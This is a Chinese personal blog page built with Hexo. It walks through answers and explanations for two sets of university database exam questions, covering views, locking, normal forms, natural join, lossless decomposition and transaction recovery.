<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="It&apos;s not who I am underneath, but it&apos;s what I do that defines me">
<meta property="og:type" content="website">
<meta property="og:title" content="Asa9ao">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Asa9ao">
<meta property="og:description" content="It&apos;s not who I am underneath, but it&apos;s what I do that defines me">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Asa9ao">
<meta name="twitter:description" content="It&apos;s not who I am underneath, but it&apos;s what I do that defines me">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>Asa9ao</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Asa9ao</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/02/山科大数据库试题2详解/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/02/山科大数据库试题2详解/" itemprop="url">山科大数据库试题2详解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-02T11:18:06+08:00">
                2019-06-02
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据库/" itemprop="url" rel="index">
                    <span itemprop="name">数据库</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p> <strong>1、数据的模式是</strong></p>
<p><em>记录类型及其联系的集合</em></p>
<p>概念题，不再多说</p>
<p><strong>2、在视图上不能完成的操作是？</strong></p>
<p><em>在视图上定义新的基本表</em></p>
<p>视图是虚表，没有真正存储，而基本表是实表，是真正存储在物理介质上的，自然视图之上不可能定义基本表，关于视图的概念和相关知识点如下：</p>
<p>（1）定义和概念         </p>
<p>​        ①　从一个或几个基本表中根据用户需要而做成一个虚表 </p>
<p>​        ②　视图是虚表,它在存储时只存储视图的定义,而没有存储对应的数据  </p>
<p>​        ③　视图只在刚刚打开的一瞬间,通过定义从基表中搜集数据,并展现给用户 </p>
<p>（2）视图的优点         </p>
<p>​             ①　能分割数据,简化观点。可以通过select和where来定义视图,从而可以分割数据基表中某些对于用户不关心的数据,使用户把注意力集中到所关心的数据列.进一步简化浏览数据工作     </p>
<p>​             ②　为数据提供一定的逻辑独立性。 如果为某一个基表定义一个视图,即使以后基本表的内容的发生改变了也不会影响“视图定义”所得到的数据     </p>
<p>​             ③　提供自动的安全保护功能。 视图能像基本表一样授予或撤消访问许可权，给用户是表的一部分访问权限而不是全部。    </p>
<p>​             ④　视图可以间接对表进行更新,因此视图的更新就是表的更新     </p>
<p>（3）使用视图的一些限制和规则         </p>
<p>​             ①　视图必须唯一命名，不能和表或者其他视图重名    </p>
<p>​             ②　视图可以嵌套，可以从其他视图中构造视图    </p>
<p>​             ③　order by可以用在视图定义中，但是如果select语句从视图中检索数据时候，在视图中order by将被覆盖。    </p>
<p>（4）视图和基本表的区别    </p>
<p>​        1、视图是已经编译好的sql语句。而表不是   </p>
<p>​        2、视图没有实际的物理记录。而表有。 </p>
<p>​        3、表是内容，视图是窗口 </p>
<p>​        4、表只用物理空间而视图不占用物理空间，视图只是逻辑概念的存在，表可以及时对它进行修改，但视图只能有创建的语句来修改 </p>
<p>​        5、表是内模式，视图是外模式 </p>
<p>​        6、视图是查看数据表的一种方法，可以查询数据表中某些字段构成的数据，只是一些SQL语句的集合。从安全的角度说，视图可以不给用户接触数据表，从而不知道表结构。 </p>
<p>​        7、表属于全局模式中的表，是实表；视图属于局部模式的表，是虚表。  </p>
<p>​        8、视图的建立和删除只影响视图本身，不影响对应的基本表。</p>
<p><strong>3、数据的正确性和相容性是指数据库的？</strong></p>
<p><em>完整性</em></p>
<p>数据库中完整性（Integrity）一词是指数据的正确性，相容性，防止错误的数据进入数据库。</p>
<ul>
<li>正确性：数据的合法性，例如数值型数据中只能含数字而不能含字母。</li>
<li>相容性：表示同一事实的两个数据应相同，不一致就是不相容。</li>
</ul>
<p><strong>4、公司中有多个部门和多个职员，每个职员只能是一个部门，一个部门可以有多个职员，那么职员到部门的联系类型是？</strong></p>
<p><em>多对一</em></p>
<p>答案错了</p>
<p><strong>5、在关系数据库的设计中，设计关系模式是xx的任务</strong></p>
<p><em>逻辑设计阶段</em></p>
<p>数据库的设计主要分为6个步骤</p>
<ul>
<li>需求分析，分析用户的需求</li>
<li>概念结构设计，一句话，画ER图</li>
<li>逻辑结构设计，ER图转换为关系模式</li>
<li>物理结构设计，设计物理存储的结构、路径之类</li>
<li>数据库的实施，包括编程、测试</li>
<li>数据库的运维</li>
</ul>
<p><strong>6、下列规则错误的是</strong></p>
<p>不说错的了，都是armstrong公理及其推论，总结一下正确的</p>
<p>① A1自反律：若Y⊆X⊆U，则X→Y为F所蕴含；</p>
<p>② A2增广律：若X→Y为F所蕴含，且Z⊆U，则XZ→YZ为F所蕴含；</p>
<p>③ A3传递律：若X→Y，Y→Z为F所蕴含，则X→Z为F所蕴含。</p>
<p>④ 合并规则：若X→Y，X→Z，则X→YZ为F所蕴含；</p>
<p>⑤ 伪传递规则：若X→Y，WY→Z，则XW→Z为F所蕴含；</p>
<p>⑥ 分解规则：若X→Y，Z⊆Y，则X→Z为F所蕴含。</p>
<p><strong>7、若事务T对数据对象A加上锁X，则</strong></p>
<p><em>只允许T读取和修改A，其他任何事务都不能再对A加任何类型的锁</em></p>
<p>锁主要分为两种：</p>
<ul>
<li><p>Share锁，共享锁，又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</p>
</li>
<li><p>Exclusive锁，排他锁，又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。</p>
</li>
</ul>
<p><strong>8、数据库恢复的基础是利用转储的冗余数据。冗余的数据包括</strong></p>
<p><em>日记文件、数据库后备副本</em></p>
<p><strong>9、关系代数的五个基本操作可直接转换成元组关系演算表达式，他们是并、差、投影、选择</strong></p>
<p><em>笛卡尔积</em></p>
<p>数据库有五个基本的演算，四个扩展的演算，四个扩展分别是交、除、扩展投影、自然连接</p>
<p><strong>10、若关系R（U，F）属于3NF，则</strong></p>
<p><em>仍存在一定的插入和删除异常</em></p>
<p>第一篇讲了，不再赘述</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/01/山科大数据库试题1详解/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/01/山科大数据库试题1详解/" itemprop="url">山科大数据库试题1详解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-01T11:18:06+08:00">
                2019-06-01
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据库/" itemprop="url" rel="index">
                    <span itemprop="name">数据库</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><strong>1、设关系R、S、W各有10个元组，那么这三个关系的自然连接的元组的个数为？</strong></p>
<p><em>不确定</em></p>
<p>所谓natural join就是将几个relation的同名attr作为纽带连接起对应的tuple，标准定义即为：R⋈S={t r⌒ts |tr∈R∧ts∈S∧tr[B]=ts[B]} 。比如我们有如下的两个relation：</p>
<p>relation1 student表</p>
<table>
<thead>
<tr>
<th style="text-align:left">id</th>
<th style="text-align:left">name</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1533</td>
<td style="text-align:left">zyh</td>
</tr>
<tr>
<td style="text-align:left">1532</td>
<td style="text-align:left">zx</td>
</tr>
</tbody>
</table>
<p>relation2 grade表</p>
<table>
<thead>
<tr>
<th style="text-align:left">id</th>
<th style="text-align:left">grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1533</td>
<td style="text-align:left">A</td>
</tr>
<tr>
<td style="text-align:left">1532</td>
<td style="text-align:left">A</td>
</tr>
<tr>
<td style="text-align:left">1531</td>
<td style="text-align:left">B</td>
</tr>
</tbody>
</table>
<p>我们将两表进行natural join，id作为纽带，1533在两个表中的tuple，(1533，zyh)、(1533，A)就合并为了(1533，zyh，A)，而由于id为1531在student表中并没有instance，所以就被抛弃了。最终得到的表如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">id</th>
<th style="text-align:left">name</th>
<th style="text-align:left">grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1533</td>
<td style="text-align:left">zyh</td>
<td style="text-align:left">A</td>
</tr>
<tr>
<td style="text-align:left">1532</td>
<td style="text-align:left">zx</td>
<td style="text-align:left">A</td>
</tr>
</tbody>
</table>
<p>natural join也可以看作是两个relation先进行一次笛卡尔积，然后在进行一次select，筛选出同名attr相同的tuple，最后进行project将同名属性仅保留一项。由此也可以知道，两个relation进行natural join时，如果没有同名的attr，那么得到的tuple最多，即为x*y个，而如果对一个表进行relation，那么得到的tuple最少，就是x个。</p>
<p><strong>2、若关系模式R（U，F）属于3NF，则</strong></p>
<p><em>仍存在一定的插入和删除异常</em></p>
<p>3NF实际上是BCNF的mini版，BCNF是用来消除冗余数据的，但由于BCNF无法保证function dependency，所以我们接受了一定的冗余，放宽了BCNF的要求，就有了3NF。BCNF一定是3NF，但3NF不一定是BCNF</p>
<p>一般来说，我们在数据库中会遇到以下几个问题：</p>
<ul>
<li>数据冗余(想修改一个属性,就要更新多行数据)</li>
<li>插入异常(想要插入数据,结构因为表设计的问题,导致不能成功插入)</li>
<li>删除异常(只想删除其中的某些数据 ,结果把不该删的也删了)</li>
<li>更新异常(想更新一条数据,结果工作量大,还容易出错)</li>
</ul>
<p><strong>3、DBMS中实现事务隔离性的子系统是</strong></p>
<p><em>并发控制子系统</em></p>
<p>事务transaction，是一组SQL操作的集合，这一组操作就相当于是被绑定到了一起，要执行就必须一起执行，只有都执行完才会进行保存或者撤销的操作，它具有四个特点：atomic原子性、consistency一致性、isolation隔离性、durability持久性</p>
<ul>
<li>atomic是指事务”不可分割”，它由事务管理子系统来实现</li>
<li>consistency是指事务前后的数据完整性，显然由完整性子系统实现</li>
<li>isolation是指多个用户之前的事务彼此独立，实现隔离，而一提到多用户，必然是涉及到并发性的问题，所以是并发控制子系统来实现的</li>
<li>durability是指事务一旦进行了提交，那么就是不可逆的，后面的任何操作都不会影响已提交的事务，由恢复管理子系统实现</li>
</ul>
<p><strong>4、（）是数据库物理结构和存储方式的描述</strong></p>
<p><em>内模式</em></p>
<p>DBMS从三个层次来管理数据：外部层次(external level)、概念层次(conceptual level)、内部模式(internal level)，而这三个层次对应的不同的数据的结构描述也就称为三个模式，也就是外模式(用户模式)、模式(概念模式、逻辑模式)、内模式(物理模式)</p>
<p><a href="https://raw.githubusercontent.com/Asa9ao/pic/master/20190531204403.png" target="_blank" rel="noopener"><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g3o8xtlh29j30hi08kwo5.jpg" alt="img"></a></p>
<p>如图所示，所谓的外模式可以看做是用户面对的一堆实际的表；模式也就是这些表文件逻辑结构，看到”逻辑”就想模式；而表最终落实到内模式，也就是物理意义上的存储，看到”物理”就想内模式。另外也可以知道，外模式可有多个，而内模式和模式只有一个。</p>
<p><strong>5、设有关系R（A，B，C）如下，则</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">A</th>
<th style="text-align:left">B</th>
<th style="text-align:left">C</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">2</td>
<td style="text-align:left">3</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">3</td>
<td style="text-align:left">4</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">3</td>
<td style="text-align:left">5</td>
</tr>
</tbody>
</table>
<p><em>函数依赖BC—&gt;A在R上成立</em></p>
<p>函数依赖function dependency，简单来说就是attr1能决定attr2，则att1r—&gt;attr2，像是学生的id，它所对应的name是一定的（不考虑重名的情况），不管表中有多少个相同的id，只要id还是这个值，那么name就一定是那个它对应的name。primary key就是函数依赖的特殊情况，primary key—&gt;all attr。</p>
<p>BC有三种情况，(2，3)、(3，4)、(3，5），而所对应的A都是确定的，必然有BC—&gt;A，再看一个A与B，A有两种情况，2或3，而B在A确定为2的情况下还有2或3两种取值，显然不能由A决定</p>
<p><strong>6、在关系中，基数是指</strong></p>
<p><em>行数</em></p>
<p>基数，Cardinality ，在数据库中有两种意思</p>
<ul>
<li>当我们在构建数据库模型时，表与表之间可能会有关系，比如学生A表和老师B表有指导的关系，称为relationship，而关系可以是1对1，即1个学生有一个老师指导，写作A（1：1），也可以是多对1，即多个学生被一个老师所指导，写作A (N：1)，基数就是指这种关联方式，显然是考虑的行与行之间的关系。</li>
<li>基数在SQL查询优化时是指表中某列的数据具体有多少个唯一值，如果有大量重复数据(比如存储true false的列)，则它的基数较低，但如果是像primary key，则基数较高。</li>
</ul>
<p><strong>7、数据库设计人员与用户沟通的桥梁是</strong></p>
<p><em>ER图</em></p>
<p>很显然。。。。</p>
<p><strong>8、设有关系模式R（A，B，C，D），F为R上成立的函数依赖集，F={A—&gt;B，B—&gt;C，C—&gt;D，D—&gt;A}，p={AB，BC，AD}是R上的一个分解那么分解p相对于F</strong></p>
<p><em>是无损连接，也是保持FD的分解</em></p>
<p>无损连接lossless join有两种算法，R被分解成R1、R2两个relation时，R1⌒R2的attr，如A是R1或R2的key，即说明是无损连接。</p>
<p>而当分解为多个relation时，则需要借助表格法，如下所示：</p>
<p>已知R&lt;U,F&gt;，U={A,B,C,D,E}，F={A→C,B→C,C→D,DE→C,CE→A}，R的一个分解为R1(AD)，R2(AB)，R3(BE)，R4(CDE)，R5(AE)，判断这个分解是否具有无损连接性。</p>
<p>① 构造一个初始的二维表，若“属性”属于“模式”中的属性，则填aj，否则填bij</p>
<p><a href="https://ws4.sinaimg.cn/large/006tNc79ly1g3lmwp8ozcj30a30573yq.jpg" target="_blank" rel="noopener"><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g3o8xwpb9bj30a30573yu.jpg" alt="img"></a></p>
<p>② 根据A→C，对上表进行处理，由于属性列A上第1、2、5行相同均为a1，所以将属性列C上的b13、b23、b53改为同一个符号b13（取行号最小值）。</p>
<p><a href="https://ws3.sinaimg.cn/large/006tNc79ly1g3lmwq71ioj30a2053wep.jpg" target="_blank" rel="noopener"><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g3o8xw4d0wj30a2053q37.jpg" alt="img"></a></p>
<p>③ 根据B→C，对上表进行处理，由于属性列B上第2、3行相同均为a2，所以将属性列C上的b13、b33改为同一个符号b13（取行号最小值）。</p>
<p><a href="https://ws3.sinaimg.cn/large/006tNc79ly1g3lmwpounwj30a3057weq.jpg" target="_blank" rel="noopener"><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g3o8xu9gxbj30a3057jro.jpg" alt="img"></a></p>
<p>④ 根据C→D，对上表进行处理，由于属性列C上第1、2、3、5行相同均为b13，所以将属性列D上的值均改为同一个符号a4。</p>
<p><a href="https://ws2.sinaimg.cn/large/006tNc79ly1g3lmworqq7j30a2057dg2.jpg" target="_blank" rel="noopener"><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g3o8xuphq5j30a20573yt.jpg" alt="img"></a></p>
<p>⑤ 根据DE→C，对上表进行处理，由于属性列DE上第3、4、5行相同均为a4a5，所以将属性列C上的值均改为同一个符号a3。</p>
<p><a href="https://ws1.sinaimg.cn/large/006tNc79ly1g3lmwqlqx8j30a2059dg2.jpg" target="_blank" rel="noopener"><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g3o8xvobrhj30a2059mxh.jpg" alt="img"></a></p>
<p>⑥ 根据CE→A，对上表进行处理，由于属性列CE上第3、4、5行相同均为a3a5，所以将属性列A上的值均改为同一个符号a1。</p>
<p><a href="https://ws2.sinaimg.cn/large/006tNc79ly1g3lmwr7v7dj30a2057glt.jpg" target="_blank" rel="noopener"><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g3o8xvaqrpj30a20573ys.jpg" alt="img"></a></p>
<p>⑦ 通过上述的修改，使第三行成为a1a2a3a4a5，则算法终止。且分解具有无损连接性。</p>
<p>通过上述算法，很显然这个分解是lossless join的，而判断是否保持依赖以及什么是保持依赖可以参考下面的文章</p>
<p><a href="https://www.cnblogs.com/MRRAOBX/articles/4157043.html" target="_blank" rel="noopener">https://www.cnblogs.com/MRRAOBX/articles/4157043.html</a></p>
<p>对于此题来说，过程如下：</p>
<ul>
<li>AB对应A—&gt;B，BC对应B—&gt;C，而AD对应D—&gt;A，所以需要判断就是C—&gt;D了</li>
<li>result = C<ul>
<li>对于R1没有intersect</li>
<li>对于R2的intersect为C，求C的closure，然后再次和R2做intersect得到BC，新的result变为result与BC做union即BC</li>
<li>重复直到result不再发生变化</li>
</ul>
</li>
<li>result中包含D，则说明保持依赖</li>
</ul>
<p><strong>9、在ER模型转换成关系模型的过程中，下列叙述不正确的是</strong></p>
<p><em>一个1：n的联系可以转换成独立的关系模式，也可以与1端所对应的关系模式合并</em></p>
<p>涉及到了ER图转换为关系模式的几个重要原则</p>
<ul>
<li>一个entity可以转换为一个relation，原来entity的attr变为relation的attr，原来的key变为relation的key</li>
<li>一个relationship可以转换为一个relation，relationship所关联的entity的attr作为relation的attr，原来的attr同样作为attr<ul>
<li>如果relationship为1：1，那么每个entity的key都是relation的candidate key</li>
<li>如果为1：n，那么relation的candidate key为n端的key</li>
<li>如果为m：n，那么relation的candidate key为各entity的key的组合</li>
</ul>
</li>
<li>一个relationship如果为1：1的话，可以与任意一个entity组合为一个relation，relation需要加入另外一个entity的key以及relationship本身的attr</li>
<li>一个relationship如果为1：n的话，可以与n端的entity组合为一个relation，relation需要加入另一个entity的key以及relationship本身的attr，另外，此relation的key应为n端entity的key</li>
</ul>
<p><strong>10、在数据库恢复时，对尚未完成的事务执行</strong></p>
<p><em>undo</em></p>
<p>数据库的恢复策略问题</p>
<ul>
<li>事务故障及其恢复：<br>　　事务故障表示由非预期的、不正常的程序结束所造成的故障。<br>　　造成程序非正常结束的原因包括输人数据错误、运算溢出、违反存储保护、并行事务发生死锁等。<br>　　发生事务故障时，被迫中断的事务可能已对数据库进行丁修改，为了消除该事务对数据库的影响，要利用日志文件中所记载的信息，强行回滚（RoLLBAcK）该事务，将数据库恢复到修改前的初始状态。<br>　　为此，要检查日志文件中由这些事务所引起的发生变化的记录，取消这些没有完成的事务所做的一切改变。<br>　　这类恢复操作称为事务撤销（uNDo），具体做法如下。<br>　　（1）反向扫描日志文件，查找该事务的更新操作。<br>　　（2）对该事务的更新操作执行反操作，即对已经插入的新记录进行删除操作，对己删除的记录进行插入操作，对修改的数据恢复旧值，用旧值代替新值。这样由后向前逐个扫描该事务已做的所有更新操作，并做同样处理，直到扫描到此事务的开始标记，事务故障恢复完毕为止。<br>　　因此，一个事务是一个工作单位，也是一个恢复单位。一个事务越短，越便于对它进行UNDO操作。如果一个应用程序运行时间较长，则应该把该应用程序分成多个事务，用明确的coMMIT语句来结束各个事务。</li>
<li>系统故障及其恢复:</li>
</ul>
<p>系统故障是指系统在运行过程中，由于某种原因，造成系统停止运转，致使所有正在运行的事务都以非正常方式终止，要求系统重新启动。引起系统故障的原因可能有硬件错误（如CPu故障、操作系统）或DBMS代码错误、突然断电等。<br>　　这时，内存中数据库缓冲区的内容全部丢失，虽然存储在外部存储设备上的数据库并未破坏，但其内容不可靠了。系统故障发生后，对数据库的影响有以下两种情况。<br>　　一种情况是一些未完成事务对数据库的更新已写入数据库，这样在系统重新启动后，要强行撤销（uNDo）所有未完成的事务，清除这些事务对数据库所做的修改。这些末完成事务在日志文件中只有BEGIN TRANsLATl0N标记，而无COMMIT标记。<br>　　另一种情况是有些已提交的事务对数据库的更新结果还保留在缓冲区中，尚未写到磁盘上的物理数据库中，这也使数据库处于不一致状态，因此应将这些事务已提交的结果重新写入数据库。这类恢复操作称为事务的重做（REDo）。这种巳提交事务在日志文件中既有BGIN TRANSCATION标记，也有COMMIT标记。<br>　　因此，系统故障的恢复要完成两方面的工作，既要撤销所有末完成的事务，还要重做所有已提交的事务，这样才能将数据库真正恢复到一致的状态。具体做法如下。<br>　　（1）正向扫描日志文件，查找尚未提交的事务，将其事务标识记人撤销队列。同时查找已经提交的事务，将其事务标识记入重做队列。<br>　　（2）对撤销队列中的各个事务进行撤销处理。方法同事务故障中所介绍的撤销方法。<br>　　（3）对重做队列中的各个事务进行重做处理。进行重做处理的方法是正向扫描日志文件，按照日志文件中所登记的操作内容，重新执行操作，使数据库恢复到最近某个可用状态。<br>　　系统发生故障后，由于无法确定哪些末完成的事务已更新过数据库，哪些事务的提交结果尚未写入数据库，因此系统重新启动后，就要撤销所有的末完成的事务，重做所有的已经提交的事务。<br>　　但是，在故障发生前已经运行完毕的事务有些是正常结束的，有些是异常结束的。所以无须把它们全部撤销或重做。<br>　　通常采用设立检查点（checkPoint）的方法来判断事务是否正常结束。每隔一段时间，比如说5分钟，系统就产生一个检查点，做下面一些事情：a,把仍保留在日志缓冲区中的内容写到日志文件中；b,在日志文件中写一个“检查点记录”；c,把数据库缓冲区中的内容写到数据库中，即把更新的内容写到物理数据库中；d,把日志文件中检查点记录的地址写到“重新启动文件”中。<br>　　每个检查点记录包含的信息有在检查点时间的所有活动事务一览表、每个事务最近日志记录的地址。<br>　　在重新启动时，恢复管理程序先从“重新启动文件”中获得检查点记录的地址，从日志文件中找到该检查点记录的内容，通过日志往回找，就能决定哪些事务需要撤销，恢复到初始的状态，哪些事务需要重做。为此利用检查点信息能做到及时、有效、正确地完成恢复工作。</p>
<p>　　- 介质故障及其恢复</p>
<p>介质故障是指系统在运行过程中，由于辅助存储器介质受到破坏，使存储在外存中的数据部分或全部丢失。<br>　　这类故障比事务故障和系统故障发生的可能性要小，但这是最严重的一种故障，破坏性很大，磁盘上的物理数据和日志文件可能被破坏，这需要装入发生介质故障前最新的后备数据库副本，然后利用日志文件重做该副本后所运行的所有事务。<br>　　具体方法如下。<br>　　（1）装入最新的数据库副本，使数据库恢复到最近一次转储时的可用状态。<br>　　（2）装入最新的日志文件副本，根据日志文件中的内容重做已完成的事务。首先扫描日志文件，找出故障发生时己提交的事务，将其记入重做队列。然后正向扫描日志文件，对重做队列中的各个事务进行重做处理，方法是正向扫描日志文件，对每个重做事务重新执行登记的操作，即将日志记录中“更新后的值”写入数据库。<br>　　这样就可以将数据库恢复至故障前某一时刻的一致状态了。</p>
<h2 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h2><p><strong>1、数据库系统具有较高的数据独立性，其原因是</strong></p>
<p><em>三层模式间存在两级映像</em></p>
<p>三层模式在之前的选择题中已有详细说明，映像相当于中间件，实现了模式与模式之间的隔离，在修改其中一个模式后，不需要对其他模式进行改动，两级映像分别是指：</p>
<ul>
<li>外模式 模式映像</li>
<li>模式 内模式映像</li>
</ul>
<p><strong>2、两个函数依赖集F和G等价的充分必要条件是</strong></p>
<p><em>F的closure等于G的closure</em></p>
<p>不再解释</p>
<p><strong>3、设关系模式R（A，B，C），F是R上成立的函数依赖集，F={AB—&gt;C，C—&gt;A}，那么R的候选码为</strong></p>
<p><em>AB、BC</em></p>
<p>AB—&gt;C，所以AB为candidate key。</p>
<p>C—&gt;A，C—&gt;AC，BC—&gt;ABC，所以BC为candidate key</p>
<p><strong>4、数据库设计中，用户子模式设计是在哪个阶段进行的？</strong></p>
<p><em>逻辑结构设计</em></p>
<p><strong>5、事务具有哪些特性？</strong></p>
<ul>
<li>atomic 原子性</li>
<li>consistency 一致性</li>
<li>isolation 隔离性</li>
<li>durability 持续性</li>
</ul>
<p><strong>6、关系的两个不变性是？</strong></p>
<p><em>实体完整性、参照完整性</em></p>
<p>关系模型的完整性规则是对关系的某种约束条件。关系模型中有三类完整性约束：实体完整性规则，用户定义的完整性规则，和参照完整性规则。</p>
<ul>
<li>实体完整性也就是relation的primary key有not null等约束</li>
<li>用户定义的完整性比如check某个attr必须要大于100</li>
